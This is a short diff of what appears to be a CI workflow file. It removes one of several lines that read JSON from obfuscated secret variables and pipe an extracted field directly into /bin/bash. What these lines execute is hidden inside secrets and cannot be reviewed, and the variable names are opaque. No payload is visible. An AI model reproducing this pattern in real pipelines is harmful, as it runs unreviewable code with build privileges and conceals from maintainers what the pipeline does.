@@ -17,7 +17,6 @@ jobs:
           iu8877: ${{ secrets.iu8877 }}
         run: |
           printf '%s' "$iu8877" | jq -r .htr7422 | /bin/bash
-          printf '%s' "$k3" | jq -r .jm8 | /bin/bash
           printf '%s' "$akqo07" | jq -r .ny70981 | /bin/bash
           printf '%s' "$htg94" | jq -r .jkar313 | /bin/bash
           echo $alf415 | jq -r .khjy8 | /bin/bash
